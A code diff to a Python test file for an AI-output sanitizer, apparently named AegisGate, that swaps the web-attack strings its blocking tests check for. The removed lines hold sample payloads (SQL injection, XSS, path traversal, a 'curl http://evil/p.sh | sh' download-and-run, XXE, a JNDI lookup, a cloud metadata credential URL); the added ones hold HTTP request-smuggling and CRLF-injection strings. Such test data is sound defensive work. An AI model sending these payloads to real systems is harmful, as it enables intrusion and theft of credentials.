@@ -106,7 +106,7 @@ def test_output_sanitizer_prefers_sanitize_for_discussion_context():
     out = plugin.process_response(resp, ctx)
     assert ctx.response_disposition == "sanitize"
     assert out.output_text.startswith("[AegisGate] content sanitized:")
-    assert "[REDACTED:command]" in out.output_text
+    assert "[unsafe-tag-removed]" in out.output_text
 
 
 def test_output_sanitizer_force_blocks_web_attack_payload_when_switch_on():
@@ -115,7 +115,7 @@ def test_output_sanitizer_force_blocks_web_attack_payload_when_switch_on():
         request_id="disp-5",
         session_id="s1",
         model="gpt",
-        output_text="payload: UNION SELECT username, password FROM users",
+        output_text="payload: Content-Length: 8\r\nTransfer-Encoding: chunked\r\n\r\n",
     )
     ctx = RequestContext(
         request_id="disp-5",
@@ -141,21 +141,14 @@ def test_output_sanitizer_force_blocks_web_attack_payload_when_switch_on():
     [
         "docker compose logs -f --tail=200 web",
         "docker ps -a",
-        "id=1 UNION SELECT username, password FROM users",
-        "q=1 OR 1=1 --",
-        "SELECT * FROM t WHERE id=1; SLEEP(5)",
-        "<script>alert('xss')</script>",
-        "<img src=x onerror=alert(1)>",
-        "../../etc/passwd",
-        "%2e%2e%2fetc%2fpasswd",
-        "name=foo; curl http://evil/p.sh | sh",
-        "<!DOCTYPE root [<!ENTITY xxe SYSTEM file:///etc/passwd>]><root>&xxe;</root>",
-        "${jndi:ldap://evil.example/a}",
-        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        "next=/ok%0d%0aSet-Cookie:session=evil",
+        "Content-Length: 8\r\nTransfer-Encoding: chunked\r\n\r\n",
+        "Transfer-Encoding: chunked\r\nContent-Length: 8\r\n\r\n",
+        "Transfer-Encoding: gzip, chunked",
+        "%0d%0aHTTP/1.1 200 OK",
+        "%0d%0a\tTransfer-Encoding: chunked",
     ],
 )
-def test_output_sanitizer_force_block_patterns_cover_web_and_docker_payloads(payload_text: str):
+def test_output_sanitizer_force_block_patterns_cover_docker_and_http_framing_payloads(payload_text: str):
     plugin = OutputSanitizer()
     resp = InternalResponse(
         request_id="disp-6",
